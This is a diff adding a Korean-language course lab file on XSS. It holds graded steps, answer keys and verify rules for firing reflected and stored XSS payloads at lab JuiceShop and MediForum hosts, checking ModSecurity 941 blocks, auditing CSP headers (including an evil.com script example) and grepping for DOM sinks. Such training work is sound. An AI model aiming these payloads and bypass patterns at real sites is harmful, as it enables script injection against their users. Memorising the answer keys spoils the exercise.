@@ -1,0 +1,450 @@
+lab_id: standalone-web-vuln-week05
+title: A03 Injection — XSS 심화 (ModSec 941 + DOM + CSP)
+version: standalone-non-ai
+course: web-vuln
+week: 5
+description: |
+  OWASP A03 의 *XSS 카테고리* 심화. 3 종 XSS (Stored / Reflected / DOM) + ModSec
+  CRS 941 family + Content Security Policy + 5 변형 매트릭스. JuiceShop + MediForum
+  의 *2 target* 의 비교.
+difficulty: hard
+duration_minutes: 200
+audience: web-vuln 5주차
+prerequisites:
+  - W04 완료 + SQLi 심화 이해
+  - 학생 PC 의 curl + python3 가용
+  - 6v6 의 attacker / web / JuiceShop / MediForum 컨테이너 가동
+objectives:
+  - XSS 3 종 (Stored / Reflected / DOM) 의 *차이* 인지
+  - ModSec CRS 941 family 의 *주요 룰* (941100 base / 941160 event handler)
+  - JuiceShop reflected XSS 5 변형 × 941 카운트 매트릭스
+  - MediForum stored XSS 시도 (Python Flask)
+  - CSP (Content Security Policy) 의 *5 directive* + 우회 시도
+  - W05 보고서 + CWE-79 매핑
+pass_threshold: 0.7
+
+steps:
+
+  - order: 1
+    instruction: |
+      ## 🎯 MISSION — JuiceShop search 의 XSS 5 변형 × ModSec 941 카운트
+
+      JuiceShop 의 `?q=` 파라미터 의 *XSS 5 변형* (평문 / case mixing / svg / img /
+      event handler) 각 의 응답 + 941 카운트 매트릭스.
+
+      ## 📚 사전 학습 (학생 혼돈 방지)
+
+      - **XSS** = Cross-Site Scripting — 사용자 브라우저 의 *임의 JS 실행*
+      - **3 종**: Stored (DB 저장 → 모든 user) / Reflected (URL → 한 user) / DOM (JS
+        의 사용자 입력 처리)
+      - **ModSec CRS 941 family** = XSS 차단 (941100 base / 941160 event handler 등)
+      - **libinjection (XSS)** = `libinjection_xss()` — token 의 분석
+      - **5 변형** = baseline / case mixing / encoded / nested / event handler
+
+      ## 💻 실행 명령
+
+      ```bash
+      ssh 6v6-attacker bash <<'SH'
+      BEFORE=$(docker exec 6v6-web bash -c "sudo grep -c 'id..\"941' /var/log/apache2/modsec_audit.log")
+
+      payloads=(
+        "<script>alert(1)</script>"
+        "<ScRiPt>alert(1)</ScRiPt>"
+        "%3Cscript%3Ealert(1)%3C/script%3E"
+        "<svg/onload=alert(1)>"
+        "<img src=x onerror=alert(1)>"
+      )
+
+      for p in "${payloads[@]}"; do
+        encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$p'))")
+        code=$(curl -s -o /dev/null -w '%{http_code}' \
+          -H 'Host: juice.6v6.lab' \
+          "http://10.20.30.1/?q=$encoded")
+        echo "$code | $p"
+      done
+
+      AFTER=$(docker exec 6v6-web bash -c "sudo grep -c 'id..\"941' /var/log/apache2/modsec_audit.log")
+      echo "941 차단 증가: $((AFTER - BEFORE))"
+      SH
+      ```
+
+      ## 📋 확인 사항
+
+      - 5 변형 모두 403 (ModSec 941 차단)
+      - 941 차단 카운트 증가 = 5+ (각 payload 1+ rule 매칭)
+
+      ## 💡 왜 이걸 하는가?
+
+      XSS = web 의 *가장 흔한 vuln*. *5 변형 의 차단 매트릭스* 가 *WAF 의 품질* 측정.
+
+      ## 🔍 결과 해석
+
+      - **정상 (강력 WAF)**: 5×403 + 941 증가 5+
+      - **일부 200 (우회)**: paranoia 상승 또는 libinjection 활성 권장
+
+      ## 비정상 시 대응
+
+      - **curl error (000)**: URL encoding 누락 — python3 urllib.parse.quote 적용
+
+      ## 실측 (2026-05-16)
+      - JuiceShop: 3/4 payload 403 + 1 의 curl error (공백 escape)
+    hint: |
+      5 XSS 변형 × 941 카운트 매트릭스. URL encoding 필수.
+    category: bypass
+    points: 25
+    answer: |
+      ssh 6v6-attacker bash <<'SH'
+      BEFORE=$(docker exec 6v6-web bash -c "sudo grep -c 'id..\"941' /var/log/apache2/modsec_audit.log")
+      for p in '<script>alert(1)</script>' '<ScRiPt>alert(1)</ScRiPt>' '<svg/onload=alert(1)>'; do
+        encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$p'))")
+        echo "$(curl -s -o /dev/null -w '%{http_code}' -H 'Host: juice.6v6.lab' "http://10.20.30.1/?q=$encoded") | $p"
+      done
+      AFTER=$(docker exec 6v6-web bash -c "sudo grep -c 'id..\"941' /var/log/apache2/modsec_audit.log")
+      echo "941 증가: $((AFTER - BEFORE))"
+      SH
+    answer_detail: 5 XSS × 941 매트릭스
+    verify:
+      type: output_contains
+      expect: '403\|941'
+      field: stdout
+      semantic:
+        intent: XSS 5 변형 차단
+        success_criteria: [5×403 + 941 증가]
+        acceptable_methods:
+          - "**[OSS] curl + URL encoding + 941 매트릭스**"
+          - "**[OSS] BurpSuite Intruder + payload set**"
+          - "**[OSS] XSStrike 자동 도구**"
+          - "**[OSS] CWE-79 XSS**"
+    target_vm: attacker
+
+  - order: 2
+    instruction: |
+      ## 🎯 MISSION — MediForum (Flask) Stored XSS 시도
+
+      MediForum (Werkzeug/Python Flask) 의 *댓글 form* 에 XSS payload 저장 시도.
+      JuiceShop 의 *Reflected* vs MediForum 의 *Stored* 비교.
+
+      ## 📚 사전 학습 (학생 혼돈 방지)
+
+      - **Stored XSS** = DB 저장 → *모든 user* 의 페이지 로딩 시 실행
+      - **endpoint** = `/comment` 또는 `/post` 또는 `/api/posts/.../comments`
+      - **JuiceShop 와 차이** = Stored 는 *공격 1 회 → N user 영향*
+      - **방어 표준** = output encoding (htmlspecialchars) + CSP
+
+      ## 💻 실행 명령
+
+      ```bash
+      ssh 6v6-attacker bash <<'SH'
+      # 1) MediForum 의 endpoint 탐색
+      echo "=== MediForum index ==="
+      curl -s -H 'Host: mediforum.6v6.lab' http://10.20.30.1/ 2>&1 | grep -E 'form|action=|comment|post' | head -10
+
+      # 2) Stored XSS 시도 (가상 endpoint)
+      for endpoint in /comment /api/comments /post /api/posts; do
+        code=$(curl -s -o /dev/null -w '%{http_code}' -X POST \
+          -H 'Host: mediforum.6v6.lab' \
+          -H 'Content-Type: application/json' \
+          -d '{"content":"<script>alert(1)</script>","author":"test"}' \
+          "http://10.20.30.1$endpoint")
+        echo "$endpoint: $code"
+      done
+      SH
+      ```
+
+      ## 📋 확인 사항
+
+      - MediForum 의 endpoint 식별 (form action 또는 API path)
+      - Stored XSS 의 *저장 응답* (200/201 = 저장 / 400 = parse / 403 = WAF)
+      - 저장 시 의 *후속 조회* 시 XSS 실행 가능 여부
+
+      ## 💡 왜 이걸 하는가?
+
+      Stored XSS = *최대 영향* (1 공격 → N user). MediForum 의 *공개 forum* 가 *대표
+      target*.
+
+      ## 🔍 결과 해석
+
+      - **403 (WAF 차단)**: ModSec 941 의 XSS 패턴 차단
+      - **201 (저장 OK)**: input validation 없음 — 즉시 *output encoding* 권장
+      - **404 (endpoint X)**: 다른 path 탐색
+
+      ## 비정상 시 대응
+
+      - **모든 endpoint 404**: HTML form 분석 후 *실 path* 추출 (Burp 또는 brutezone)
+      - **Content-Type 다름**: `application/x-www-form-urlencoded` 또는 `multipart/form-data`
+    hint: |
+      MediForum endpoint 탐색 + 4 path 시도 + Stored XSS 응답.
+    category: exploit
+    points: 25
+    answer: |
+      ssh 6v6-attacker bash <<'SH'
+      curl -s -H 'Host: mediforum.6v6.lab' http://10.20.30.1/ 2>&1 | grep -E 'form|action=' | head -10
+      for endpoint in /comment /api/comments /post /api/posts; do
+        code=$(curl -s -o /dev/null -w '%{http_code}' -X POST -H 'Host: mediforum.6v6.lab' -H 'Content-Type: application/json' -d '{"content":"<script>alert(1)</script>"}' "http://10.20.30.1$endpoint")
+        echo "$endpoint: $code"
+      done
+      SH
+    answer_detail: MediForum endpoint 탐색 + Stored XSS 시도
+    verify:
+      type: output_contains
+      expect: 'endpoint\|comment\|post'
+      field: stdout
+      semantic:
+        intent: Stored XSS
+        success_criteria: [endpoint 식별 + 저장 응답]
+        acceptable_methods:
+          - "**[OSS] form action 추출**"
+          - "**[OSS] OWASP ZAP 의 Spider crawl**"
+          - "**[OSS] gobuster dir brute**"
+          - "**[OSS] Burp Discover Content**"
+          - "**[OSS] CWE-79 + Stored 특화**"
+    target_vm: attacker
+
+  - order: 3
+    instruction: |
+      ## 🎯 MISSION — CSP (Content Security Policy) 의 5 directive + 우회 시도
+
+      6v6 의 7 vhost 의 *CSP 헤더* 분석 + CSP 의 *5 directive* 인지 + 우회 시도
+      (script-src bypass).
+
+      ## 📚 사전 학습 (학생 혼돈 방지)
+
+      - **CSP** = Content Security Policy (RFC 7762) — *허용 source* whitelist
+      - **5 핵심 directive**:
+        - `default-src` = fallback (모든 type)
+        - `script-src` = JS 의 source 제한 (가장 중요)
+        - `style-src` = CSS source
+        - `img-src` = image source
+        - `connect-src` = AJAX / WebSocket source
+      - **'self'** = 같은 origin 만
+      - **'unsafe-inline'** = `<script>...</script>` 의 inline 허용 (XSS 위험)
+      - **'nonce-XXX'** = 한 페이지 의 *한 번 만* 의 nonce
+
+      ## 💻 실행 명령
+
+      ```bash
+      ssh 6v6-attacker bash <<'SH'
+      echo "=== 7 vhost 의 CSP 헤더 ==="
+      for h in juice dvwa neobank govportal mediforum admin aicompanion; do
+        csp=$(curl -sI -H "Host: $h.6v6.lab" http://10.20.30.1/ 2>&1 | grep -i 'content-security-policy' | head -1 | cut -c1-100)
+        echo "$h: ${csp:-CSP 없음}"
+      done
+
+      echo ""
+      echo "=== CSP 우회 시뮬 (script-src 'self' 의 inline 차단 확인) ==="
+      cat <<'EOF'
+      CSP: script-src 'self'
+        ✓ <script src="/app.js"></script>     ← 허용 (same origin)
+        ✗ <script>alert(1)</script>           ← 차단 (inline)
+        ✗ <script src="https://evil.com/x.js"></script>  ← 차단 (외부)
+
+      CSP: script-src 'self' 'unsafe-inline'
+        ✓ <script>alert(1)</script>           ← 허용 (unsafe-inline)
+
+      우회 패턴:
+        1. JSONP endpoint (allowed origin)
+        2. AngularJS / VueJS 의 *expression* (older version)
+        3. 같은 origin 의 *upload 가능 파일* (XSS via upload)
+      EOF
+      SH
+      ```
+
+      ## 📋 확인 사항
+
+      - 7 vhost 의 CSP 적용 여부
+      - CSP 의 *5 directive* + 'self' / 'unsafe-inline' / nonce 사용
+      - 우회 패턴 3+ 인지
+
+      ## 💡 왜 이걸 하는가?
+
+      CSP = *modern XSS 방어 의 표준*. 단 *모든 vuln 해결 X* — *우회 가능*. CSP +
+      *output encoding* 의 *2 축* 필수.
+
+      ## 🔍 결과 해석
+
+      - **CSP 있음 + strict**: `script-src 'self'` 만 — strong
+      - **CSP 있음 + 'unsafe-inline'**: 절반 — inline XSS 가능
+      - **CSP 없음**: 무방비 — 즉시 적용 권장
+    hint: |
+      7 vhost CSP 헤더 + 5 directive + 우회 패턴.
+    category: analysis
+    points: 20
+    answer: |
+      ssh 6v6-attacker bash <<'SH'
+      for h in juice dvwa neobank govportal mediforum admin aicompanion; do
+        csp=$(curl -sI -H "Host: $h.6v6.lab" http://10.20.30.1/ 2>&1 | grep -i 'content-security-policy' | head -1 | cut -c1-100)
+        echo "$h: ${csp:-CSP 없음}"
+      done
+      SH
+    answer_detail: 7 vhost CSP audit
+    verify:
+      type: output_contains
+      expect: 'juice\|CSP'
+      field: stdout
+      semantic:
+        intent: CSP audit
+        success_criteria: [7 vhost CSP 응답]
+        acceptable_methods:
+          - "**[OSS] curl -I + grep content-security-policy**"
+          - "**[OSS] Mozilla Observatory (외부 — 학습 환경 X)**"
+          - "**[OSS] CSP Evaluator (Google)**"
+          - "**[OSS] CWE-1021 Improper Restriction of Rendered UI Layers**"
+    target_vm: attacker
+
+  - order: 4
+    instruction: |
+      ## 🎯 MISSION — DOM XSS 의 *5 sink* 인지 + 시뮬
+
+      DOM XSS = JS 의 *사용자 입력 처리* 의 vuln. server 의 response 변경 없음 —
+      *client-side 만*. *5 위험 sink* 인지.
+
+      ## 📚 사전 학습 (학생 혼돈 방지)
+
+      - **DOM XSS** = `document.write` / `eval` / `innerHTML` / `setTimeout(string)` /
+        `location.href` 의 5 sink
+      - **source vs sink** = source (사용자 입력) → sink (실행 위치)
+      - **DOMPurify** = client-side HTML 의 sanitize lib
+      - **trusted types** = modern browser 의 *enforce 모드*
+
+      ## 💻 실행 명령
+
+      ```bash
+      ssh 6v6-attacker bash <<'SH'
+      echo "=== JuiceShop 의 JS 의 5 sink grep ==="
+      curl -s -H 'Host: juice.6v6.lab' http://10.20.30.1/ > /tmp/juice.html
+      curl -s -H 'Host: juice.6v6.lab' http://10.20.30.1/main.js 2>&1 > /tmp/juice-main.js
+
+      echo "innerHTML: $(grep -c 'innerHTML' /tmp/juice.html /tmp/juice-main.js 2>/dev/null | awk -F: '{s+=$2} END {print s}')"
+      echo "eval: $(grep -c 'eval(' /tmp/juice.html /tmp/juice-main.js 2>/dev/null | awk -F: '{s+=$2} END {print s}')"
+      echo "document.write: $(grep -c 'document.write' /tmp/juice.html /tmp/juice-main.js 2>/dev/null | awk -F: '{s+=$2} END {print s}')"
+      echo "setTimeout: $(grep -c 'setTimeout' /tmp/juice.html /tmp/juice-main.js 2>/dev/null | awk -F: '{s+=$2} END {print s}')"
+      echo "location.href: $(grep -c 'location.href' /tmp/juice.html /tmp/juice-main.js 2>/dev/null | awk -F: '{s+=$2} END {print s}')"
+
+      echo ""
+      echo "=== DOM XSS 시뮬 payload ==="
+      cat <<'EOF'
+      vuln 코드 예:
+        const params = new URLSearchParams(location.search);
+        document.getElementById('result').innerHTML = params.get('name');
+
+      payload: ?name=<img src=x onerror=alert(1)>
+        ← innerHTML 의 *script tag 차단 default*
+        ← 단 *event handler (onerror)* 의 *실행*
+      EOF
+      SH
+      ```
+
+      ## 📋 확인 사항
+
+      - JuiceShop 의 JS 의 *5 sink* count
+      - DOM XSS 의 *vuln 코드 패턴* 인지
+      - *img onerror* 의 *innerHTML 의 script tag 차단 우회* 인지
+
+      ## 💡 왜 이걸 하는가?
+
+      DOM XSS = *server log 에 X* (client 만). server-side WAF (ModSec) 의 *완전
+      우회*. CSP + DOMPurify 의 *client-side 방어* 필수.
+
+      ## 🔍 결과 해석
+
+      - **modern app (Angular/React/Vue)**: 5 sink 자동 escape — DOM XSS 거의 X
+      - **legacy jQuery**: `$().html()` 의 *unsafe* 다수
+      - **trusted types 적용**: enforce 모드 — 모든 *string → DOM* 의 *type 검증*
+    hint: |
+      5 sink (innerHTML/eval/document.write/setTimeout/location.href) grep + 시뮬.
+    category: analysis
+    points: 15
+    answer: |
+      ssh 6v6-attacker bash <<'SH'
+      curl -s -H 'Host: juice.6v6.lab' http://10.20.30.1/ > /tmp/juice.html
+      curl -s -H 'Host: juice.6v6.lab' http://10.20.30.1/main.js > /tmp/juice-main.js 2>&1
+      for sink in innerHTML 'eval(' 'document.write' setTimeout 'location.href'; do
+        echo "$sink: $(grep -c "$sink" /tmp/juice.html /tmp/juice-main.js 2>/dev/null | awk -F: '{s+=$2} END {print s}')"
+      done
+      SH
+    answer_detail: 5 sink grep + DOM XSS 시뮬
+    verify:
+      type: output_contains
+      expect: 'innerHTML\|sink\|eval'
+      field: stdout
+      semantic:
+        intent: DOM XSS sink
+        success_criteria: [5 sink count]
+        acceptable_methods:
+          - "**[OSS] grep 5 sink**"
+          - "**[OSS] DOM Invader (Burp extension)**"
+          - "**[OSS] DOMPurify lib 적용**"
+          - "**[OSS] trusted types API**"
+          - "**[OSS] CWE-79 + DOM 특화**"
+    target_vm: attacker
+
+  - order: 5
+    instruction: |
+      ## 🎯 MISSION — W05 종합 보고서 (XSS 4 영역 + CWE-79 + CSP 권장)
+
+      W05 의 4 영역 (Reflected JuiceShop + Stored MediForum + CSP audit + DOM XSS)
+      종합 보고서. *XSS 의 3 종 cover* + *방어 3 표준* (output encoding + CSP +
+      trusted types).
+
+      ## 💻 산출물 — W02 의 4 섹션 형식
+
+      ```markdown
+      # W05 — A03 XSS 심화 분석 보고서
+
+      ## 1. Executive Summary
+      - target: JuiceShop + MediForum + 7 vhost CSP audit
+      - 발견 vuln 4 영역
+      - 권장: output encoding + CSP 강화 + DOMPurify 적용
+
+      ## 2. Detailed Findings
+      ### F1 Reflected XSS (JuiceShop) — 5×403 (ModSec 강력)
+      ### F2 Stored XSS (MediForum) — endpoint 응답 분석
+      ### F3 CSP audit — 7 vhost
+      ### F4 DOM XSS — 5 sink grep
+
+      ## 3. Remediation
+      ### F1-F2 server-side
+      - 즉시: output encoding (htmlspecialchars / Jinja autoescape)
+      - 단기: ModSec libinjection 활성
+
+      ### F3 CSP
+      - 즉시: `default-src 'self'; script-src 'self'`
+      - 단기: nonce 적용 + 'unsafe-inline' 제거
+
+      ### F4 DOM XSS
+      - 즉시: DOMPurify 적용 + 5 sink 의 *별 escape*
+      - 단기: trusted types API enforce
+
+      ## 4. 매핑
+      | F | ATT&CK | CVSS | CWE |
+      | F1 | T1059.007 JavaScript | 6.1 (M) | CWE-79 |
+      | F2 | T1059.007 | 8.3 (H) | CWE-79 + Stored |
+      | F3 | T1059.007 | 5.4 (M) | CWE-1021 |
+      | F4 | T1059.007 | 6.5 (M) | CWE-79 + DOM |
+      ```
+
+      ## 📋 확인 사항
+
+      - 4 섹션 + 4 finding
+      - 매핑 표 (CVSS + CWE + ATT&CK)
+      - 방어 3 표준 (encoding + CSP + trusted types)
+    hint: |
+      4 finding + CWE-79 + T1059.007 매핑.
+    category: synthesis
+    points: 15
+    answer: 위 4 섹션 형식
+    answer_detail: W05 종합 보고서
+    verify:
+      type: output_contains
+      expect: 'CWE-79'
+      field: stdout
+      semantic:
+        intent: W05 종합
+        success_criteria: [4 finding + 매핑]
+        acceptable_methods:
+          - "**[관리적] PTES 4 섹션**"
+          - "**[관리적] CWE-79 + CWE-1021**"
+          - "**[관리적] T1059.007 JavaScript**"
+          - "**[관리적] CSP 권장 5 directive**"
+          - "**[관리적] DOMPurify + trusted types**"
+    target_vm: bastion
